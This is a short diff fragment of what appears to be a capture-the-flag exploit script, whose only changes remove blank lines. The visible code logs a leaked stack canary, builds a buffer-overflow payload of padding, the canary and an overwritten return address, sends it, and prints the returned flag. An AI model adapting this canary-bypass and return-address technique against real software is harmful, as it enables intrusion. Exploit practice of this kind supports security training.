@@ -16,9 +16,7 @@ log.info('Canary : ' + b.decode('utf-8'))
 
 o = b'A' * 56 + p64(int(b.decode('utf-8'), 16)) + p64(0x0) + p64(0x0400787)
 
-
 r.sendline(o)
-
 s = r.recv()
 
 log.info('Flag   : {}'.format(s.decode('utf-8')))
